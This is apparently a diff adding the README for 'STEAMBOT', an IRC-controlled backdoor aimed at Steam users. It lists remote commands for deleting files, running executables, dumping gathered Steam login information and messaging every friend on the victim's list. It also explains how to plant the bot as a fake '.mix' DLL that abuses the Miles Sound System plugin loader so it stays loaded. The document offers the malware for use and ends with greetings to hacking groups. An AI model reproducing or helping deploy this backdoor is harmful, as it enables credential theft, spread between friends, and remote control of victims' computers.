@@ -1,0 +1,47 @@
+STEAMBOT 1.0 source by s0beit of myg0t
+----------------------------------------------
+Commands;
+
+!join <channel> (join a given channel)
+!part <channel> (part a given channel)
+!quit (quit IRC (doesn't end the process))
+
+!auth <password> (auth user, must be pre-compiled into the program)
+!logout (logout (de-auth))
+
+!delete <file> (delete a file on the computer)
+!sysinfo (display drive(s) info)
+!execute <executable file> (execute .exe files)
+!listproc (list active processes)
+!exit (closes the steam process (and disconnects from IRC))
+
+!slogininfo (display all gathered steam account information)
+
+!friendsname (display current friends name)
+!setfriendsname <friends name> (set friends name)
+!steamid (display user steamid representation (uint64))
+!friend_state (display the current state of the user (Online, Busy, Offline, etc))
+!friend_msg <message to send> (send a message to ALL friends on the list)
+
+!info (display bot info)
+!cmddump (debug function, refer to source)
+!postcommand (debug function, refer to source)
+
+----------------------------------------------
+Information about the usage;
+
+Simply find a way to plant the compiled DLL file into /<STEAM PATH>/bin/,
+the file extension of the DLL must be ".mix", this exploit was founded by
+several other programmers in other circumstances and can be seen in a ton of 
+programs using the "Miles Sound System", the exploit basically exploits the
+Miles plugin system, it loads "plugins" as DLL files, and if the DLL file
+does not match plugin specification it rejects it, we reject the rejection
+(in FreeLibrary) so the library stays loaded, and that is our hole.
+
+----------------------------------------------
+Greetz;
+myg0t.com
+bottalk.us
+milw0rm.com
+irc.lcirc.net #myg0t, #bottalk, #milw0rm
+irc.fuckurinter.net #FYINet to support me for no real reason :p
